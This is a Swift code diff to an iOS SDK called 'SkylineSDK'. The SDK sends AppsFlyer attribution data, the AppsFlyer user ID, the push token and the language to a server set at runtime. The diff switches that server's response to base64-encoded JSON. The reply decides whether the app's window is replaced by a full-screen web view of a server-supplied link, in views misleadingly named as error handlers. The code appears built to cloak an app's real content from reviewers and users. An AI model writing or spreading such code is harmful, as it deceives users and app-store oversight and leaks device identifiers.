@@ -16,15 +16,24 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
     @AppStorage("finalData") var finalData: String?
     
     public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
+        // Create the dictionary in the desired order:
         var conversionData = [String: Any]()
-        conversionData[appsIDString] = AppsFlyerLib.shared().getAppsFlyerUID()
+        
+        // 1) AFdata
         conversionData[appsDataString] = conversionInfo
-        conversionData[tokenString] = deviceToken
+        
+        // 2) AF_user_id
+        conversionData[appsIDString] = AppsFlyerLib.shared().getAppsFlyerUID()
+        
+        // 3) language
         conversionData[langString] = Locale.current.languageCode
-
+        
+        // 4) deviceToken
+        conversionData[tokenString] = deviceToken
+        
         let jsonData = try! JSONSerialization.data(withJSONObject: conversionData, options: .fragmentsAllowed)
         let jsonString = String(data: jsonData, encoding: .utf8) ?? ""
-
+        
         sendDataToServer(code: jsonString) { result in
             switch result {
             case .success(let message):
@@ -80,7 +89,7 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
         sessionConfig.timeoutIntervalForResource = 20
         self.session = Alamofire.Session(configuration: sessionConfig)
     }
-
+    
     public func initialize(
         appsFlyerKey: String,
         appID: String,
@@ -103,9 +112,9 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
         self.domen = domen
         self.paramName = paramName
         self.mainWindow = window
-
+        
         try? PushExpressManager.shared.initialize(appId: pushExpressKey)
-
+        
         AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerKey
         AppsFlyerLib.shared().appleAppID = appID
         AppsFlyerLib.shared().delegate = self
@@ -120,13 +129,13 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
         
         completion(.success("Initialization completed successfully"))
     }
-
+    
     public func registerForRemoteNotifications(deviceToken: Data) {
         let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
         PushExpressManager.shared.transportToken = tokenString
         self.deviceToken = tokenString
     }
-
+    
     @objc private func handleSessionDidBecomeActive() {
         if !self.hasSessionStarted {
             AppsFlyerLib.shared().start()
@@ -134,38 +143,52 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
             ATTrackingManager.requestTrackingAuthorization { _ in }
         }
     }
-
+    
     public func sendDataToServer(code: String, completion: @escaping (Result<String, Error>) -> Void) {
         let parameters = [paramName: code]
         session.request(domen, method: .get, parameters: parameters)
             .validate()
-            .responseDecodable(of: ResponseData.self) { response in
+            .responseString { response in
                 switch response.result {
-                case .success(let decodedData):
-                    PushExpressManager.shared.tags["webmaster"] = decodedData.naming
-                    self.statusFlag = decodedData.first_link
-                    try? PushExpressManager.shared.activate()
+                case .success(let base64String):
                     
-                    if self.initialURL == nil {
-                        self.initialURL = decodedData.link
-                        completion(.success(decodedData.link))
-                    } else if decodedData.link == self.initialURL {
+                    guard let jsonData = Data(base64Encoded: base64String) else {
+                        let error = NSError(domain: "SkylineSDK", code: -1,
+                                            userInfo: [NSLocalizedDescriptionKey: "Invalid base64 data"])
+                        completion(.failure(error))
+                        return
+                    }
+                    do {
+                        let decodedData = try JSONDecoder().decode(ResponseData.self, from: jsonData)
+                        
+                        PushExpressManager.shared.tags["webmaster"] = decodedData.naming
+                        self.statusFlag = decodedData.first_link
+                        try? PushExpressManager.shared.activate()
+                        
+                        if self.initialURL == nil {
+                            self.initialURL = decodedData.link
+                            completion(.success(decodedData.link))
+                        } else if decodedData.link == self.initialURL {
                             if self.finalData != nil {
                                 completion(.success(self.finalData!))
                             } else {
                                 completion(.success(decodedData.link))
                             }
-                    } else if self.statusFlag {
-                        self.finalData = nil
-                        self.initialURL = decodedData.link
-                        completion(.success(decodedData.link))
-                    } else {
-                        self.initialURL = decodedData.link
-                        if self.finalData != nil {
-                            completion(.success(self.finalData!))
-                        } else {
+                        } else if self.statusFlag {
+                            self.finalData = nil
+                            self.initialURL = decodedData.link
                             completion(.success(decodedData.link))
+                        } else {
+                            self.initialURL = decodedData.link
+                            if self.finalData != nil {
+                                completion(.success(self.finalData!))
+                            } else {
+                                completion(.success(decodedData.link))
+                            }
                         }
+                        
+                    } catch {
+                        completion(.failure(error))
                     }
                     
                 case .failure:
@@ -180,7 +203,7 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
         var naming: String
         var first_link: Bool
     }
-
+    
     func showWeb(with url: String) {
         self.mainWindow = UIWindow(frame: UIScreen.main.bounds)
         let webController = WebController()
@@ -189,24 +212,24 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
         self.mainWindow?.rootViewController = navController
         self.mainWindow?.makeKeyAndVisible()
     }
-
+    
     
     public class WebController: UIViewController, WKNavigationDelegate, WKUIDelegate {
-
+        
         private var mainErrorsHandler: WKWebView!
         
         @AppStorage("savedData") var savedData: String?
         @AppStorage("statusFlag") var statusFlag: Bool = false
         
         public var errorURL: String!
-
+        
         public override func viewDidLoad() {
             super.viewDidLoad()
-
+            
             let config = WKWebViewConfiguration()
             config.preferences.javaScriptEnabled = true
             config.preferences.javaScriptCanOpenWindowsAutomatically = true
-
+            
             let viewportScript = """
             var meta = document.createElement('meta');
             meta.name = 'viewport';
@@ -215,14 +238,14 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
             """
             let userScript = WKUserScript(source: viewportScript, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
             config.userContentController.addUserScript(userScript)
-
+            
             mainErrorsHandler = WKWebView(frame: .zero, configuration: config)
             mainErrorsHandler.isOpaque = false
             mainErrorsHandler.backgroundColor = .white
             mainErrorsHandler.uiDelegate = self
             mainErrorsHandler.navigationDelegate = self
             mainErrorsHandler.allowsBackForwardNavigationGestures = true
-
+            
             view.addSubview(mainErrorsHandler)
             mainErrorsHandler.translatesAutoresizingMaskIntoConstraints = false
             NSLayoutConstraint.activate([
@@ -231,7 +254,7 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
                 mainErrorsHandler.leadingAnchor.constraint(equalTo: view.leadingAnchor),
                 mainErrorsHandler.trailingAnchor.constraint(equalTo: view.trailingAnchor)
             ])
-
+            
             loadContent(urlString: errorURL)
         }
         
@@ -241,20 +264,20 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
                 SkylineSDK.shared.finalData = finalUrl
             }
         }
-
+        
         public override func viewWillAppear(_ animated: Bool) {
             super.viewWillAppear(animated)
             navigationItem.largeTitleDisplayMode = .never
             navigationController?.isNavigationBarHidden = true
         }
-
+        
         private func loadContent(urlString: String) {
             guard let encodedURL = urlString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
                   let url = URL(string: encodedURL) else { return }
             let request = URLRequest(url: url)
             mainErrorsHandler.load(request)
         }
-
+        
         public func webView(_ webView: WKWebView,
                             createWebViewWith configuration: WKWebViewConfiguration,
                             for navigationAction: WKNavigationAction,
@@ -263,7 +286,7 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
             popupWebView.navigationDelegate = self
             popupWebView.uiDelegate = self
             popupWebView.allowsBackForwardNavigationGestures = true
-
+            
             mainErrorsHandler.addSubview(popupWebView)
             popupWebView.translatesAutoresizingMaskIntoConstraints = false
             NSLayoutConstraint.activate([
@@ -272,25 +295,25 @@ public class SkylineSDK: NSObject, AppsFlyerLibDelegate {
                 popupWebView.leadingAnchor.constraint(equalTo: mainErrorsHandler.leadingAnchor),
                 popupWebView.trailingAnchor.constraint(equalTo: mainErrorsHandler.trailingAnchor)
             ])
-
+            
             return popupWebView
         }
-
+        
     }
     
     public struct WebControllerSwiftUI: UIViewControllerRepresentable {
         public var errorDetail: String
-
+        
         public init(errorDetail: String) {
             self.errorDetail = errorDetail
         }
-
+        
         public func makeUIViewController(context: Context) -> WebController {
             let viewController = WebController()
             viewController.errorURL = errorDetail
             return viewController
         }
-
+        
         public func updateUIViewController(_ uiViewController: WebController, context: Context) {}
     }
 }
